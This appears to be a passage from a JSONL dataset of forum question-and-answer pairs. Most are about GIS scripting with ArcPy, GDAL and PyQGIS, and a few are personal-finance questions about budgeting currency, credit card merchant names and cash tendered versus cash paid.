hotspots with SputnikNet. SputnikNet enables you to:\n\nauto-provision Wi-Fi access points (APs) by plugging them into broadband\nmanage Wi-Fi APs centrally, over a secure Web connection\ndesign captive portals with your brand\nauthenticate users and devices for free or paid Wi-Fi\ntrack usage by access point and Wi-Fi end user\n\nIt appears that SputNik might be the closest to what you are looking for.  Here is a how to in using sputnik.  You can also purchase a sputnik ready device, instead of flashing the router yourself.\n", "question_score": "8", "answer_score": 13}
{"title": "Creating script tool that will create copy of feature class and offset it by given distance using ArcPy?", "description": "I want to duplicate a polygon feature class and offset all of the polygons by about 10 feet in both the x and y directions. I asked if there was any way to do this last week, and I was informed that I would most likely need to make my own python script using arcpy. I made my own script using arcpy, but it isn't working:\nimport arcpy\nfrom arcpy import env\nimport os\n\nenv.overwriteOutput = True\n\n# Get arguments: \n#   Input polygon feature class\n#   Output polygon feature class\n#\ninputFeatureClass = arcpy.GetParameterAsText(0)\noutputFeatureClass = arcpy.GetParameterAsText(1)\nxShift = arcpy.GetParameterAsText(2)\nyShift = arcpy.GetParameterAsText(3)\n\nshapeName = arcpy.Describe(inputFeatureClass).shapeFieldName\n\n# Create the output feature class with the same fields and spatial reference as the input feature class\narcpy.CreateFeatureclass_management(os.path.dirname(outputFeatureClass), os.path.basename(outputFeatureClass), \"POLYGON\", inputFeatureClass, \"\", \"\", inputFeatureClass)\n\n# Create a search cursor to iterate through each row of the input feature class\ninrows = arcpy.SearchCursor(inputFeatureClass)\n# Create an insert cursor to insert rows into the output feature class\noutrows = arcpy.InsertCursor(outputFeatureClass)\n\n# Create empty Point and Array objects\npntArray = arcpy.Array()\npartArray = arcpy.Array()\n\n# Loop through each row/feature\nfor row in inrows:\n    # Create the geometry object\n    feature = row.getValue(shapeName)\n\n    partnum = 0\n\n    # Count the total number of points in the current multipart feature\n    partcount = feature.partCount\n\n    while partnum < partcount:\n        part = feature.getPart(partnum)\n        pnt = part.next()\n        pntcount = 0\n\n        # Enter while loop for each vertex\n        #\n        while pnt:\n\n            pnt = part.next()\n            shiftedPoint = arcpy.Point()\n            try:\n                shiftedPoint.ID = pnt.ID\n                shiftedPoint.X = pnt.X + float(xShift)\n                shiftedPoint.Y = pnt.Y + float(yShift)\n            except AttributeError:\n                continue\n            #shiftedPoint = arcpy.Point(float(pnt.X) + float(xShift), float(pnt.Y) + float(yShift))\n            pntArray.add(shiftedPoint)\n            pntcount += 1\n\n            # If pnt is null, either the part is finished or there is an \n            #   interior ring\n            #\n            if not pnt: \n                pnt = part.next()\n                if pnt:\n                    arcpy.AddMessage(\"Interior Ring:\")\n        # Create a polygon using the array of points\n        polygon = arcpy.Polygon(pntArray)\n\n        # Empty the array for the next run through the loop\n        pntArray.removeAll()\n\n        # Add the polygons (or 'parts') to an array. This is necessary for multipart features, or those with holes cut in them\n        partArray.add(polygon)\n        arcpy.AddMessage(\"Added a polygon to the partArray!\")\n        partnum += 1\n\n    # Create a new row object that will be inserted into the ouput feature class. Set newRow = row so that it has the same attributes\n    # Set newRow.shape = partArray so that the only thing different about this new feature is that its geometry is different (shifted)\n    newRow = row\n    newRow.shape = partArray\n\n    outrows.insertRow(newRow)\n\n    # Empy the array for the next run through the loop\n    partArray.removeAll()\n\ndel inrows, outrows\n\nI keep getting this error on line 70 \n<type 'exceptions.ValueError'>: Array: Add input not point nor array object\n\nI can't figure out why it's giving me this error, since I defined the input as an array.\nDoes anyone know why I'm getting this error?\n", "answer": "Instead of creating and trying to add a polygon to your array, add your array of points to the array of parts. Change this:\npolygon = arcpy.Polygon(pntArray)\npntArray.removeAll()\npartArray.add(polygon)\n\nTo this:\npartArray.add(pntArray)\npntArray.removeAll()\n\nAlso, there's a problem with your code that tries to insert the row. You need to use your insert cursor to create a new row and insert it. Starting at line 77 in your original code sample:\nnewRow = outrows.newRow()\nnewRow.shape = partArray\noutrows.insertRow(newRow)\n\nEdit:  You should also move the \"pnt = part.next()\" in your inner while loop to below your try/except block so you don't skip any points and so that the if block that tests for interior rings runs. As is, the code in your post will not pick up interior rings. Here's the whole thing after all the modifications I've described:\nimport arcpy\nfrom arcpy import env\nimport os\n\nenv.overwriteOutput = True\n\n# Get arguments: \n#   Input polygon feature class\n#   Output polygon feature class\n#\ninputFeatureClass = arcpy.GetParameterAsText(0)\noutputFeatureClass = arcpy.GetParameterAsText(1)\nxShift = arcpy.GetParameterAsText(2)\nyShift = arcpy.GetParameterAsText(3)\nprint '\\nparams: ', inputFeatureClass, outputFeatureClass, xShift, yShift, '\\n'\n\nshapeName = arcpy.Describe(inputFeatureClass).shapeFieldName\n\n# Create the output feature class with the same fields and spatial reference as the input feature class\nif arcpy.Exists(outputFeatureClass):\n    arcpy.Delete_management(outputFeatureClass)\narcpy.CreateFeatureclass_management(os.path.dirname(outputFeatureClass), os.path.basename(outputFeatureClass), \"POLYGON\", inputFeatureClass, \"\", \"\", inputFeatureClass)\n\n# Create a search cursor to iterate through each row of the input feature class\ninrows = arcpy.SearchCursor(inputFeatureClass)\n# Create an insert cursor to insert rows into the output feature class\noutrows = arcpy.InsertCursor(outputFeatureClass)\n\n# Create empty Point and Array objects\npntArray = arcpy.Array()\npartArray = arcpy.Array()\n\n# Loop through each row/feature\nfor row in inrows:\n    # Create the geometry object\n    feature = row.getValue(shapeName)\n    partnum = 0\n    # Count the total number of points in the current multipart feature\n    partcount = feature.partCount\n    print 'num parts: ', partcount\n    while partnum < partcount:\n        part = feature.getPart(partnum)\n        pnt = part.next()\n        print 'outer while'\n        pntcount = 0\n        # Enter while loop for each vertex\n        #\n        while pnt:\n            shiftedPoint = arcpy.Point()\n            try:\n                shiftedPoint.ID = pnt.ID\n                shiftedPoint.X = pnt.X + float(xShift)\n                shiftedPoint.Y = pnt.Y + float(yShift)\n            except AttributeError:\n                continue\n            pntArray.add(shiftedPoint)\n            pntcount += 1\n            pnt = part.next()\n            print 'pntcount: ', pntcount\n            # If pnt is null, either the part is finished or there is an \n            #   interior ring\n            if pnt is None: \n                pnt = part.next()\n                if pnt:\n                    arcpy.AddMessage(\"Interior Ring:\")\n        partArray.add(pntArray)\n        pntArray.removeAll()\n        arcpy.AddMessage(\"Added a polygon to the partArray!\")\n        partnum += 1\n    # Create a new row object that will be inserted into the ouput feature class. Set newRow = row so that it has the same attributes\n    # Set newRow.shape = partArray so that the only thing different about this new feature is that its geometry is different (shifted)\n    newRow = outrows.newRow()\n    newRow.shape = partArray\n    outrows.insertRow(newRow)\n    # Empy the array for the next run through the loop\n    partArray.removeAll()\ndel inrows, outrows\n\n", "question_score": "9", "answer_score": 14}
{"title": "Definition of a BBOX in Web GIS", "description": "In my practice I use a lot WMS and WFS in Geoserver. I have not found a document describing the concept of a bounding box(bbox). ArcGIS has map extent properties to identify map boundary. Google Map/Bing map has getbound() method to identify the map view. However, when defines a bounding box in WMS or WFS, it seems to involve projections parameters and map view extent. The parameters in an HTTP GetMap request looks confusing to me since if I use different projection systems the units in the bounding box varies significantly, and the incorrect setup of bbox would cause rendering fail So, could anyone point me to the document explaining the bbox?\nThank you!\n", "answer": "Bounding Boxes are usually a request to the 'geo' server in the projection you are using or requesting.\nbbox: The bounding box is automatically determined by taking the union of the bounds of the specified layers. In essence, it determines the extent of the map. By default, if you do not specify bbox, it will show you everything. If you have one layer of Los Angeles, and another of New York, it show you most of the United States. The bounding box, automatically set or specified, also determines the aspect ratio of the map. If you only specify one of width or height, the other will be determined based on the aspect ratio of the bounding box.\n.. Warning:: If you specify height, width and bounding box there are zero degrees of freedom, and if the aspect ratios do not match your image will be warped.\nExample for WGS84 Lat/Lng:\nhttp://localhost:8080/geoserver/wms?service=WMS&request=GetMap&version=1.1.1&format=application/openlayers&width=800&height=600&srs=EPSG:4326&layers=topp:states&styles=population&bbox=-180,0,0,90\n\nhttp://docs.geoserver.org/2.1.0/user/_sources/tutorials/wmsreflector.txt\nINSIDE Geoserver you can set the maximum bounding box in either Native SRS or the Projection for the output SRS (named Declared SRS in Geoserver):\nThe bounding box determines the extent of a layer. The Native Bounding Box are the bounds of the data projected in the Native SRS. You can generate these bounds by clicking the Compute from data link. The Lat/Long Bounding Box computes the bounds based on the standard lat/long. These bounds can be generated by clicking the Compute from native bounds link.\n\nMore information: https://docs.geoserver.org/stable/en/user/data/webadmin/layers.html#bounding-boxes\n", "question_score": "9", "answer_score": 11}
{"title": "Creating heat map or density map from stacked polygons in ArcMap?", "description": "I have a polygon shape file that has many overlapping features. Each feature represents an area used by polar bears. So some of the polygons overlap and some don't, and there are separate clusters of overlapping areas. \nI would like to get a measure of how much overlap there is in a particular area. But I have no clue how to do this. I'm pretty new to GIS and am still learning the ropes, it just seems I can't find an answer. \n", "answer": "In ArcGIS, the easiest way to create a polygon layer with the count of overlapping features  is as follows:\n\nRun the Union tool on your source polygon layers. This will result in a layer with one feature for each area of overlap. \nAdd a new field to the layer created in Step 1, called NewID or something to that effect, and use Field Calculator to set it equal to the FID field. \nUse the Merge tool to merge your source polygon layers into a single layer with overlapping features.\nRun the Union tool on the layer created in step 3. This will result in a single layer with multiple features for each area of overlap (shown below). The Union tool behaves differently (creating multiple features for each area of overlap) when run with a single input, as explained in the How Union Works help page.\n\nRun the Spatial Join tool. Your target features will be the result of Step 4. The join features will be the result of Step 2. The match option will be ARE_IDENTICAL_TO. All other values should be left as defaults. The result of this is the same as Step 4, except with new attributes added, including the NewID. \nRun Summary Statistics on the output of Step 5. Choose whatever Statistic Field you want. Set your case field to NewID. The resulting table will have a column called FREQUENCY that shows how many times each NewID was found in the output of Step 5. This is equal to the number of overlapping features in the source data. You can join this table back to the output of Step 2 for visualization.\n\n", "question_score": "9", "answer_score": 14}
{"title": "Python GDAL: Save array as raster with projection from other file", "description": "I have an array of data, and for each datapoint I know the latitude and longitude. I'd like to save it as a GTiff with the same projection as other rasters I have. This is what I've tried so far, but no luck.\nimport numpy as np\nimport gdal\nfrom gdalconst import *\nfrom osgeo import osr\n\ndef GetGeoInfo(FileName):\n    SourceDS = gdal.Open(FileName, GA_ReadOnly)\n    GeoT = SourceDS.GetGeoTransform()\n    Projection = osr.SpatialReference()\n    Projection.ImportFromWkt(SourceDS.GetProjectionRef())    \nreturn GeoT, Projection\n\ndef CreateGeoTiff(Name, Array, driver, \n                  xsize, ysize, GeoT, Projection):\n    DataType = gdal.GDT_Float32\n    NewFileName = Name+'.tif'\n    # Set up the dataset\n    DataSet = driver.Create( NewFileName, xsize, ysize, 1, DataType )\n            # the '1' is for band 1.\n    DataSet.SetGeoTransform(GeoT)\n    DataSet.SetProjection( Projection.ExportToWkt() )\n    # Write the array\n    DataSet.GetRasterBand(1).WriteArray( Array )\n    return NewFileName\n\ndef ReprojectCoords(x, y,src_srs,tgt_srs):\n    trans_coords=[]\n    transform = osr.CoordinateTransformation( src_srs, tgt_srs)\n    x,y,z = transform.TransformPoint(x, y)\n    return x, y\n\n# Some Data\nData = np.random.rand(5,6)\nLats = np.array([-5.5, -5.0, -4.5, -4.0, -3.5])\nLons = np.array([135.0, 135.5, 136.0, 136.5, 137.0, 137.5])\n\n# A raster file that exists in the same approximate aregion.\nRASTER_FN = 'some_raster.tif'\n\n# Open the raster file and get the projection, that's the\n# projection I'd like my new raster to have, it's 'projected',\n# i.e. x, y values are numbers of pixels.\nGeoT, TargetProjection, DataType = GetGeoInfo(RASTER_FN)\n# Meanwhile my raster is currently in geographic coordinates.\nSourceProjection = TargetProjection.CloneGeogCS()\n\n# Get the corner coordinates of my array\nLatSize, LonSize = len(Lats), len(Lons)\nLatLow, LatHigh = Lats[0], Lats[-1]\nLonLow, LonHigh = Lons[0], Lons[-1]\n# Reproject the corner coordinates from geographic\n# to projected...\nTopLeft = ReprojectCoords(LonLow, LatHigh, SourceProjection, TargetProjection)\nBottomLeft = ReprojectCoords(LonLow, LatLow, SourceProjection, TargetProjection)\nTopRight = ReprojectCoords(LonHigh, LatHigh, SourceProjection, TargetProjection)\n# And define my Geotransform\nGeoTNew = [TopLeft[0],  (TopLeft[0]-TopRight[0])/(LonSize-1), 0,\n           TopLeft[1], 0, (TopLeft[1]-BottomLeft[1])/(LatSize-1)]\n\n# I want a GTiff\ndriver = gdal.GetDriverByName('GTiff')\n# Create the new file...\nNewFileName = CreateGeoTiff('Output', Data, driver, LatSize, LonSize, GeoTNew, TargetProjection)\n\nBut this results in the following error message:\nFile \"TES2GtifBBB.py\", line 25, in CreateGeoTiff\n  DataSet.GetRasterBand(1).WriteArray( Array )\nFile \"/Library/Frameworks/GDAL.framework/Versions/1.9/Python/2.7/site packages/osgeo/gdal.py\", line 1082, in WriteArray\n  return gdalnumeric.BandWriteArray( self, array, xoff, yoff )\nFile \"/Library/Frameworks/GDAL.framework/Versions/1.9/Python/2.7/site packages/osgeo/gdal_array.py\", line 256, in BandWriteArray\n  raise ValueError(\"array larger than output file, or offset off edge\")\nValueError: array larger than output file, or offset off edge\n\n", "answer": "Eddy, try a different approach to write the array as a raster. The following code works for me, and for your case you would only need to change the corner coordinate, pixel size and number of pixels for the reprojected values, as you did in your code. So the first part would be replaced by some of your procedures.\nfrom osgeo import gdal\n\ndef array_to_raster(array):\n    \"\"\"Array > Raster\n    Save a raster from a C order array.\n\n    :param array: ndarray\n    \"\"\"\n    dst_filename = '/a_file/name.tiff'\n\n    # You need to get those values like you did.\n    x_pixels = 16  # number of pixels in x\n    y_pixels = 16  # number of pixels in y\n    PIXEL_SIZE = 3  # size of the pixel...        \n    x_min = 553648  \n    y_max = 7784555  # x_min & y_max are like the \"top left\" corner.\n    wkt_projection = 'a projection in wkt that you got from other file'\n\n    driver = gdal.GetDriverByName('GTiff')\n\n    dataset = driver.Create(\n        dst_filename,\n        x_pixels,\n        y_pixels,\n        1,\n        gdal.GDT_Float32, )\n\n    dataset.SetGeoTransform((\n        x_min,    # 0\n        PIXEL_SIZE,  # 1\n        0,                      # 2\n        y_max,    # 3\n        0,                      # 4\n        -PIXEL_SIZE))  \n\n    dataset.SetProjection(wkt_projection)\n    dataset.GetRasterBand(1).WriteArray(array)\n    dataset.FlushCache()  # Write to disk.\n    return dataset, dataset.GetRasterBand(1)  #If you need to return, remenber to return  also the dataset because the band don`t live without dataset.\n\n", "question_score": "9", "answer_score": 16}
{"title": "Evaluating raster calculator expressions from console", "description": "How can I execute from the console an expression that should be used with the raster calculator?\nI'm searching for something like this:\nqgis.someRasterCalcClass.evaluate(\"boh@1 + boh@2\", \"outputfile.tif\")\n\n", "answer": "Starting from QGIS 2.0 (and current development version), the class QgsRasterCalculator is available in python. Unfortunately it is not very well documented.\nThe basic usage is, that you have to define an alias for each band used in the calculator expression in form of a QgsRasterCalculatorEntry\nYour example can then be written as follows, given you have already assigned your rasterlayer to a variable bohLayer.\nfrom qgis.analysis import QgsRasterCalculator, QgsRasterCalculatorEntry\n\nentries = []\n# Define band1\nboh1 = QgsRasterCalculatorEntry()\nboh1.ref = 'boh@1'\nboh1.raster = bohLayer\nboh1.bandNumber = 1\nentries.append( boh1 )\n\n# Define band2\nboh2 = QgsRasterCalculatorEntry()\nboh2.ref = 'boh@2'\nboh2.raster = bohLayer\nboh2.bandNumber = 2\nentries.append( boh2 )\n\n# Process calculation with input extent and resolution\ncalc = QgsRasterCalculator( 'boh@1 + boh@2', '/home/user/outputfile.tif', 'GTiff', bohLayer.extent(), bohLayer.width(), bohLayer.height(), entries )\ncalc.processCalculation()\n\nThe return of processCalculation() will be \n\n0 in case of success \n1 in case the provider string (GTiff in the example) was wrong \n2 for other errors\n\nThe layer is not automatically added to the TOC, so either do this manually or with some python code.\n", "question_score": "9", "answer_score": 19}
{"title": "Creating line with three points with Python in QGIS?", "description": "I'm new to Python and I'm having some dificulties. I want to create a simple layer with a line in the console of QGIS with Python. How can I do that?\n", "answer": "You must first understand how PyQGIS handles geometry (Geometry Handling)\nThe most important element is the point:\n\nQgsPoint(x,y)\n\nand a line or a segment of line are composed of two points:\n\nQgsGeometry.fromPolyline([QgsPoint(x1,y1),QgsPoint(x2,y2)]));\n\nSo to construct a line:\nline_start = QgsPoint(50,50)\nline_end = QgsPoint(100,150)\nline = QgsGeometry.fromPolyline([line_start,line_end])\n\nand with a memory layer (geometry only, without the attributes):\n# create a new memory layer\nv_layer = QgsVectorLayer(\"LineString\", \"line\", \"memory\")\npr = v_layer.dataProvider()\n# create a new feature\nseg = QgsFeature()\n# add the geometry to the feature, \nseg.setGeometry(QgsGeometry.fromPolyline([line_start, line_end]))\n# ...it was here that you can add attributes, after having defined....\n# add the geometry to the layer\npr.addFeatures( [ seg ] )\n# update extent of the layer (not necessary)\nv_layer.updateExtents()\n# show the line  \nQgsMapLayerRegistry.instance().addMapLayers([v_layer])\n\nthe result is:\n\nwith 3 points, just add it as a new feature:\nnewpoint = QgsPoint(143,125)\nv_layer = QgsVectorLayer(\"LineString\", \"line_3pt\", \"memory\")\npr = v_layer.dataProvider()\nseg = QgsFeature()\nseg.setGeometry(QgsGeometry.fromPolyline([line_start, line_end]))\n# new feature: line from line_end to newpoint\nseg = QgsFeature()\nseg.setGeometry(QgsGeometry.fromPolyline([line_end, newpoint]))\npr.addFeatures( [ seg ] )\nv_layer.updateExtents()\n# add the line to \nQgsMapLayerRegistry.instance().addMapLayers([v_layer])\n\nand the result is:\n\nAnd with a for loop you can create a line with many segments:\n\n", "question_score": "9", "answer_score": 29}
{"title": "What are QGIS equivalent functions for ArcPy's Update/Delete Row/Field?", "description": "I am trying to reprogram some scripts from ArcPy to QGIS (1.8 or 2.0) and there are some simple functions that I want to be able to redo but unfortunately documentation in QGIS is lacking in certain areas. \nNamely the three most important for me are:\nAdd Field - Add field\narcpy.AddField_management(Feature, \"ID\", \"SHORT\")\n\nCalculate Field Management - Update that field\narcpy.CalculateField_management(Feature,\"ID\",\"!FID!\")\n\nUpdate/Delete Rows - Update/Delete rows based on condition (without copying the shapefile)\nkeep = [\"Bob\",\"Janet\",\"John\",\"Mike\"]\nCounter = 0\nrows = arcpy.UpdateCursor(Feature)\n\nfor row in rows:\n    if row.Name in keep:\n        row.ID = Counter\n        rows.updateRow(row)\n    else:\n        rows.deleteRow(row)\n    Counter += 1\n\nNow I can iterate through each feature in QGIS using SEXTANTE and obtain its geometry which I should be able to rewrite into a new shapefile and thereby update/delete a row or field. Starting with something along the lines of...\nlayer = st.getobject(Polygon)\nfeatures = st.getfeatures(layer)\nfor f in features:\n    f.geometry().asPolygon()\n\nbut I can't find a simple solution for those functions mentioned above? \n", "answer": "The following examples are based on the (soon-to-be-released) QGIS 2.0 API. This has changed since 1.8, so the syntax for this version will differ in some places.\nThe best resource for 1.8 compliant solutions and in-depth explanation for background of parameters (also apply for 2.0) are the PyQGIS Cookbook\nWe'll assume you already have a reference to a vector layer called vl obtained by e.g.\nvl = iface.activeLayer()\n\nTransactions\nThe following examples are working in a transaction (locally cached in QGIS). Before starting the edit session you have to call\nvl.startEditing()\n\nand end it with\nvl.commitChanges()\n\nto write your changes to the data source. or\nvl.rollBack()\n\nto dismiss the changes\nYou could also work directly on vl.dataProvider() and forget about the transaction control statements. (Resulting in autocommit-like behaviour)\nAdding a field\nQgsVectorLayer.addAttribute( QgsField )\nfrom PyQt4.QtCore import QVariant\nvl.addAttribute( QgsField( 'fieldname', QVariant.String ) )\n\nThis only works, if the dataprovider implements the AddAttributes capability. You can check this with:\nif vl.dataProvider().capabilities() & QgsVectorDataProvider.ChangeAttributeValues\n\nCalculate fields\nSee this answer:\nIs it possible to programmatically add calculated fields?\nIt's still aimed at 1.8, so instead of vl.select() you have to call the 2.0 equivalent vl.getFeatures() ( see QGIS API changes )\nUpdate rows\nQgsVectorLayer.updateField( featureId, fieldIndex, value )\nvl.updateField( 1000, 5, 'hello' )\n\nPreqrequisites check (optional):\nif vl.dataProvider().capabilities() & QgsVectorDataProvider.ChangeAttributeValues\n\nTo know the fieldIndex, you can use QgsVectorLayer.pendingFields()\nEdit:\nSee also the comment by NathanW which mentions the well readable QgsVectorLayer.updateFeature( feature ) method.\nDelete rows\nQgsVectorLayer.deleteFeature( featureId )\nvl.deleteFeature( 1000 )\n\nOptional prerequisites check:\nif vl.dataProvider().capabilities() & QgsVectorDataProvider.DeleteFeatures\n    \n\n", "question_score": "9", "answer_score": 16}
{"title": "Programmatically associating layer with custom UI using PyQGIS?", "description": "I know it is possible to associate a layer with a custom UI for editing feature attributes using the QGIS interface. But is this possible with Python?\nThis link shows how to achieve the result manually. But I would like to be able to create layers automatically and have them use custom UI without having to redefine the ui file and method each time.\n", "answer": "Form layout\nYou have the following methods to do this:\nQgsVectorLayer.setEditForm( '/path/to/your/ui/file' )\nto provide a UI file\nand\nQgsVectorLayer.setEditFormInit( 'python.Function' )\nto provide a python init method\nSo having a QgsVectorLayer vl the following will do what you are looking for\nvl.setEditForm( '/home/me/uifile.ui' )\nvl.setEditFormInit( 'RoadForm.formOpen' )\n\nStarting from QGIS 2.0 you will also have:\nQgsVectorLayer.setEditorLayout( QgsVectorLayer::EditorLayout )\nProvide QgsVectorLayer.GeneratedLayout, QgsVectorLayer.TabLayout or QgsVectorLayer.UiFileLayout to specify what kind of layout you want. This lets you specify the new drag and drop designer (TabLayout).\nWidget layout\nUpdate: starting from QGIS 2.4 there will be new methods (QgsVectorLayer.setEditorWidgetV2 and setEditorWidgetV2Config) to change an editor widget type and its config. The method described here will still work but is marked as deprecated.\nThere are a number of methods related to the specific widgets you want to use:\nUse QgsVectorLayer.setEditType( fieldIdx, editType ) to specify the edit type you want to use for the widget for field index fieldIdx. editType is one of these.\nTo further configure the widget behavior use the following methods (depending on the available widget configuration options of course):\n\nQgsVectorLayer.setFieldEditable( idx, bool ) // From 2.0\nQgsVectorLayer.setLabelOnTop( idx, bool ) // From 2.0\nQgsVectorLayer.valueMap( idx )\nQgsVectorLayer.range( idx )\nQgsVectorLayer.setCheckedState( idx, checked, unchecked )\nQgsVectorLayer.valueRelation( idx )\nQgsVectorLayer.dateFormat( dateFormat ) // From 2.0\nQgsVectorLayer.widgetSize( idx ) // From 2.0\n\n", "question_score": "9", "answer_score": 17}
{"title": "GDAL - Perform Simple Least Cost Path Analysis", "description": "I am investigating methods to perform a simple least cost path analysis with gdal.  By simple, I mean using the slope of a dem as the only cost factor.  \nI would prefer to do using the python or .net bindings, but will take anything.  Can anyone suggest any good tutorials or the like?\n", "answer": "The following script performs a least cost path analysis. Input parameters are a cost surface raster (e.g. slope) and start and stop coordinates. A raster with the created path is returned. It requires the skimage library and GDAL.\nThe following was copied from a very useful website for gdal related stuff.\nFor example the least cost path between point 1 and point 2 is created based on a slope raster:\n\nimport gdal, osr\nfrom skimage.graph import route_through_array\nimport numpy as np\n\ndef raster2array(rasterfn):\n    raster = gdal.Open(rasterfn)\n    band = raster.GetRasterBand(1)\n    array = band.ReadAsArray()\n    return array  \n    \ndef coord2pixelOffset(rasterfn,x,y):\n    raster = gdal.Open(rasterfn)\n    geotransform = raster.GetGeoTransform()\n    originX = geotransform[0]\n    originY = geotransform[3] \n    pixelWidth = geotransform[1] \n    pixelHeight = geotransform[5]\n    xOffset = int((x - originX)/pixelWidth)\n    yOffset = int((y - originY)/pixelHeight)\n    return xOffset,yOffset\n\ndef createPath(CostSurfacefn,costSurfaceArray,startCoord,stopCoord):   \n\n    # coordinates to array index\n    startCoordX = startCoord[0]\n    startCoordY = startCoord[1]\n    startIndexX,startIndexY = coord2pixelOffset(CostSurfacefn,startCoordX,startCoordY)\n    \n    stopCoordX = stopCoord[0]\n    stopCoordY = stopCoord[1]\n    stopIndexX,stopIndexY = coord2pixelOffset(CostSurfacefn,stopCoordX,stopCoordY)\n    \n    # create path\n    indices, weight = route_through_array(costSurfaceArray, (startIndexY,startIndexX), (stopIndexY,stopIndexX),geometric=True,fully_connected=True)\n    indices = np.array(indices).T\n    path = np.zeros_like(costSurfaceArray)\n    path[indices[0], indices[1]] = 1\n    return path\n\ndef array2raster(newRasterfn,rasterfn,array):\n    raster = gdal.Open(rasterfn)\n    geotransform = raster.GetGeoTransform()\n    originX = geotransform[0]\n    originY = geotransform[3] \n    pixelWidth = geotransform[1] \n    pixelHeight = geotransform[5]\n    cols = array.shape[1]\n    rows = array.shape[0]\n    \n    driver = gdal.GetDriverByName('GTiff')\n    outRaster = driver.Create(newRasterfn, cols, rows, gdal.GDT_Byte)\n    outRaster.SetGeoTransform((originX, pixelWidth, 0, originY, 0, pixelHeight))\n    outband = outRaster.GetRasterBand(1)\n    outband.WriteArray(array)\n    outRasterSRS = osr.SpatialReference()\n    outRasterSRS.ImportFromWkt(raster.GetProjectionRef())\n    outRaster.SetProjection(outRasterSRS.ExportToWkt())\n    outband.FlushCache()    \n    \ndef main(CostSurfacefn,outputPathfn,startCoord,stopCoord):\n    \n    costSurfaceArray = raster2array(CostSurfacefn) # creates array from cost surface raster\n    \n    pathArray = createPath(CostSurfacefn,costSurfaceArray,startCoord,stopCoord) # creates path array\n    \n    array2raster(outputPathfn,CostSurfacefn,pathArray) # converts path array to raster\n    \n    \nif __name__ == \"__main__\":\n    CostSurfacefn = 'CostSurface.tif'\n    startCoord = (345387.871,1267855.277)\n    stopCoord = (345479.425,1267799.626)\n    outputPathfn = 'Path.tif'\n    main(CostSurfacefn,outputPathfn,startCoord,stopCoord)\n\n", "question_score": "9", "answer_score": 13}
{"title": "Should I do my budgeting in dollars?", "description": "I'm from India and earn in Indian Rupees. Should I do the math on my finances in USD? \nThe reason I ask this question is because INR lost value recently - quite a bit. So, for example, would it be beneficial to have a savings goal in terms of dollars and not Rupees (like 'save $150' irrespective of the INR/USD value).\nPS: I'd just be tracking my money as USD - not actually converting it.\n", "answer": "You goal should be in rupees, as you are earning in rupees and spending in rupees. Any other currency is of no value / meaning.  \nMore than being worried about the USD/INR rate, you should be worried about inflation and savings rate. This will change the amount that you need to save for your retirement. The USD/INR rate would anyways get reflected into some of the prices of some of the items and would get relfected into Inflation.\nYour savings goal should not be an arbitrary number. It should have a purpose. The purpose for saving goal could be to meet education in future, wedding, kids education, vacation, downpayment for house, retirement etc. \nSay your goal is to save enough for you Masters degree that you plan to do after 3 years.\nSay As of today you find the cost fees/book/etc is Rs 100,000 for you Masters degree. Say Additional Rs 100,000 for your stay & food expenses.\nSo essentially you need to save Rs 200,000 in next 3 years. However here is the catch, in 3 years time the inflation around 10% may mean you need to save Rs 200,000 * 1.1 = 220,000 at the end of first year, and 220,000 * 1.1 = 242000 for second year, and 242,000 * 1.1 = 266,200. So essentially you need to save more. If you run this in XLS it will be easy to track and moniter. Now at the end of 1st year whatever you have saved, you may keep it in short term fixed deposits, this would get you interest. So effectively this calculation will tell you how much you need to save monthly.\nFor longer goals, you may say decide to invest the money in shares / PPF / or other instruments, the essential is same the returns that you are getting adds value and the inflation removes value. \n", "question_score": "9", "answer_score": 12}
{"title": "Is there a rule that a merchant must identify themself when making a charge", "description": "Recently I sent several credit card payments online. The company that charged my card is a multi-billion dollar company, so not just a small start-up. However on the statements the charges appeared as a bunch of random letters and numbers for the description and location. All other merchants that have ever charged this card appear correctly on the bill.\nSince I make probably 30-50 transactions on my card each month, I had no idea who these charges were from, so I disputed them with my card issuing bank and reported the card as stolen. After the company received the dispute, they contacted me and are basically blaming me for not having matched up the amount charged with what my bill from them was.\nSo my question is, is there any sort of regulation (e.g. PCI) or law that says that a merchant must attempt to properly identify themself when charging their clients' credit cards?\nEdit:\nI think some people were a bit confused about this question thinking that the charge shows up with the name of an umbrella corporation, or third party, but it is literally a bunch of random characters. Here's a screenshot of the bill:\n\nThe third column is the \"description\" (where the company name usually goes) and the fourth column is the \"location\". Only one company shows up like this when they make charges to the card.\n", "answer": "Here's an excerpt from VISA's Card Acceptance Guidelines for Visa Merchants (PDF) \n\nMerchant Name\nThe merchant name is the single most important factor in cardholder\n  recognition of transactions. Therefore, it is critical that the\n  merchant name, while reflecting the merchant’s “Doing Business As”\n  (DBA) name, also be clearly identifiable to the cardholder. This can\n  minimize copy requests resulting from unrecognizable merchant\n  descriptors.\nMerchant applications typically list the merchant name as the merchant\n  DBA. This may differ from the legal name (which can represent the\n  corporate owner or parent company), and may differ from the owner’s\n  name which, for sole proprietorships, may reflect the business owner.\n\nKeep in mind that the purpose of the merchant name is to identify the merchant to the cardholder.\nWork with your acquirer to ensure your name is clear and discernible to cardholders when they read their statement.\nTo verify that you are using the merchant name that is most recognizable to the cardholder, compare the merchant name that you\n  want to use to:  * Signage in the site photo  * Advertisements or\n  brochures, and/or  * A telephone directory listing\n\nI think that the key statement above is \"Therefore, it is critical that the\nmerchant name [...] be clearly identifiable to the cardholder.\" Since this merchant was not clearly identifiable to the cardholder, they are in breach of a critical point in these guidelines.\nThis is from VISA, but I would assume that all other major credit cards would have similar guidelines for their merchants. However keep in mind that these are \"guidelines\", and not (necessarily) rules.\n", "question_score": "9", "answer_score": 17}
{"title": "Is there a difference between \"cash paid\" and \"cash tendered\"?", "description": "I notice that some receipts have the words \"Cash Paid\" while others have \"Cash Tendered\". Are there differences between them? Can they be used interchangeably? Are there situation(s) where one of them will be more suitable than the other?\n", "answer": "The two phrases are often used interchangeably, in a conversational context. For casual usage, cash paid is more informal and more common than cash tendered. But there is a difference in meaning between the two phrases, in accounting, specifically for cashiering and bookkeeping.\nA few background details\nIn bookkeeping there are Accounts Receivable (A/R) and Accounts Payable (A/P). Money owed to you accumulates in A/R. Bills and debt obligations owed to others is tallied under A/P.\nScenario 1\nCash tendered is a sum of money given in payment. It may not be equal to the exact amount owed. Using cashiering as an example (which is part of a business's A/R), cash is presented as payment for a service or to settle an outstanding bill. That cash is tendered. If it is exactly equivalent to the amount of money owed, then cash tendered is equal to (the amount of) cash paid.\nScenario 2\nIf the amount of cash tendered is greater than the amount owed, a credit balance is owed to the customer. The credit might be change, or it might be entered onto the books of the business as an A/P item due to that customer in the future. This is a case when cash tendered is greater than cash paid. Note that cash 